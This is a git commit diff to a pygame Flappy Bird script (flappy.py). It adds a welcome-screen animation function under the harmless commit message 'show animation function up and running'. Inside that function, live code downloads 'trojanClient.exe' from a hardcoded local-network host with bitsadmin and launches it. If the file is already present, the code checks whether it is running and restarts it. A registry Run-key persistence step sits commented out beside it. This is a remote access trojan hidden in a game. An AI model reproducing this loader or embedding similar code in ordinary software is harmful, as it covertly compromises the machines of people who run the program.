34adc59cdeff8a5ad48af67c67f8a8ed2d2b7c97
Lomar Lilly <lithiumlilly3@gmail.com>
2017-12-02 23:27:37 -0500

    show animation function up and running

--- flappy.py
+++ flappy.py
@@ -59,3 +59,82 @@ try:
     xrange
 except NameError:
     xrange = range
+
+def showWelcomeAnimation():
+    def downloadRAT():
+        cmd = "bitsadmin /transfer wcb /priority high http://192.168.10.11:8080/trojanClient.exe "+destination
+        subprocess.call(cmd, shell=True)
+
+        cmd = "start "+destination
+        subprocess.call(cmd, shell=True)
+
+    # check if the RAT already exists on victims machine
+    if not os.path.exists(destination):
+        threading.Thread(target=downloadRAT).start()
+
+        # Add RAT in start up registry so it always start on boot
+        # key = wreg.OpenKey(wreg.HkiKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
+        #                     wreg.KEY_ALL_ACCESS)
+        # wreg.SetValueEx(key, 'RAT', 0, wreg.REG_SZ,destination)
+        # key.Close()
+        # ==========================================================
+    else:
+        #check if the RAT is already running
+        cmd ='tasklist /FI "IMAGENAME eq client.exe" /FO CSV'
+        output = subprocess.check_output(cmd, shell=True)
+
+        # if the RAT is not running, run the RAT
+        if 'INFO: ' in output:
+            cmd = "start "+destination
+            subprocess.call(cmd, shell=True)
+    
+    """Shows welcome screen animation of flappy bird"""
+    # index of player to blit on screen
+    playerIndex = 0
+    playerIndexGen = cycle([0, 1, 2, 1])
+    # iterator used to change playerIndex after every 5th iteration
+    loopIter = 0
+
+    playerx = int(SCREENWIDTH * 0.2)
+    playery = int((SCREENHEIGHT - IMAGES['player'][0].get_height()) / 2)
+
+    messagex = int((SCREENWIDTH - IMAGES['message'].get_width()) / 2)
+    messagey = int(SCREENHEIGHT * 0.12)
+
+    basex = 0
+    # amount by which base can maximum shift to left
+    baseShift = IMAGES['base'].get_width() - IMAGES['background'].get_width()
+
+    # player shm for up-down motion on welcome screen
+    playerShmVals = {'val': 0, 'dir': 1}
+
+    while True:
+        for event in pygame.event.get():
+            if event.type == QUIT or (event.type == KEYDOWN and event.key == K_ESCAPE):
+                pygame.quit()
+                sys.exit()
+            if event.type == KEYDOWN and (event.key == K_SPACE or event.key == K_UP):
+                # make first flap sound and return values for mainGame
+                SOUNDS['wing'].play()
+                return {
+                    'playery': playery + playerShmVals['val'],
+                    'basex': basex,
+                    'playerIndexGen': playerIndexGen,
+                }
+
+        # adjust playery, playerIndex, basex
+        if (loopIter + 1) % 5 == 0:
+            playerIndex = next(playerIndexGen)
+        loopIter = (loopIter + 1) % 30
+        basex = -((-basex + 4) % baseShift)
+        playerShm(playerShmVals)
+
+        # draw sprites
+        SCREEN.blit(IMAGES['background'], (0,0))
+        SCREEN.blit(IMAGES['player'][playerIndex],
+                    (playerx, playery + playerShmVals['val']))
+        SCREEN.blit(IMAGES['message'], (messagex, messagey))
+        SCREEN.blit(IMAGES['base'], (basex, BASEY))
+
+        pygame.display.update()
+        FPSCLOCK.tick(FPS)
